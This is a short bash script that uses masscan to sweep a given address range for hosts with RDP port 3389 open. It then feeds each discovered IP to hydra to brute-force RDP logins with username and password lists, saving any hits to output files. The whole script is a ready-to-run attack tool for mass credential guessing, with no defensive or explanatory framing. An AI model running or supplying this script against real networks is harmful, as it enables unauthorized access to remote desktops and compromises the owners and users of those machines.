d=$(masscan -p3389 $1 )
ips=$(echo $d | sed 's/Discovered /\nDiscovered/g' | awk '{ print $5 }')
echo $ips > results.txt
for lin1 in $(cat results.txt); do hydra -L users.txt -P pass.txt -e ns -o Output/rdp_$lin1.txt -I -V -W 3 -t 10 $lin1 rdp ; done
